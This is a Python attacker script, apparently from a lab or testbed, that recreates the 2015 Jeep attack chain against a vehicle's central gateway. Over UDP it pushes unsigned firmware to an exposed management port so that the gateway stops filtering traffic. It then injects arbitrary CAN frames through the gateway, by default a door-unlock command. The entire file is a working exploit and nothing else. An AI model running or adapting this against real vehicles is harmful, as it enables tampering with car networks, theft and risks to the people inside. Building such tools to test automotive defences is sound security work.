#!/usr/bin/env python3
# reflash_gw.py - canary Jeep-chain attacker tool (PC side, NOT deployed).
#
# Reproduces the escalation and impact of the 2015 Jeep chain against the CGW:
#   AUTO-01/05  push an UNSIGNED firmware to the exposed management port (:30510)
#               so the gateway stops being a firewall and relays arbitrary CAN.
#   AUTO-02     inject a frame through the now-subverted gateway (:30509 RelayFrame).
#
# Usage: reflash_gw.py <host> [can_id_hex] [data_hex]   (default 120 00 = unlock)
#   reflash_gw.py 192.168.2.1                 -> reflash, then unlock (LOCK_CMD 0x00)
#   reflash_gw.py 192.168.2.1 120 01          -> reflash, then lock
#   reflash_gw.py 192.168.2.1 7df 0201        -> reflash, then an arbitrary frame
import socket
import struct
import sys

MAIN_SERVICE = 0x1401
MGMT_SERVICE = 0x1402
M_UPDATEFW = 0x0001
M_RELAYFRAME = 0x0003
MT_REQUEST = 0x00


def pack(service, method, payload):
    msg_id = (service << 16) | method
    length = 8 + len(payload)
    return struct.pack('>IIIBBBB', msg_id, length, 0x0bad0001, 1, 1, MT_REQUEST, 0) + payload


def call(host, port, pkt):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2)
    s.sendto(pkt, (host, port))
    try:
        return s.recvfrom(1024)[0]
    except socket.timeout:
        return None


def main():
    if len(sys.argv) < 2:
        print('usage: reflash_gw.py <host> [can_id_hex] [data_hex]  (default 120 00 = unlock)')
        return
    host = sys.argv[1]
    can_id = int(sys.argv[2], 16) if len(sys.argv) > 2 else 0x120
    data = bytes.fromhex(sys.argv[3]) if len(sys.argv) > 3 else b'\x00'

    # 1) unsigned firmware: 32-byte bogus signature + policy body. No key, no sig.
    fw = b'\x00' * 32 + b'allow_raw=1'
    r = call(host, 30510, pack(MGMT_SERVICE, M_UPDATEFW, fw))
    print('reflash:', 'accepted' if r and r[-1:] == b'\x01' else 'refused/no-response')

    # 2) arbitrary CAN injection through the subverted gateway.
    payload = struct.pack('>H', can_id) + data[:8]
    r = call(host, 30509, pack(MAIN_SERVICE, M_RELAYFRAME, payload))
    ok = r is not None and r[14] != 0x81
    print(f'inject {can_id:#05x} data={data[:8].hex()}:', 'ok' if ok else 'refused')


if __name__ == '__main__':
    main()
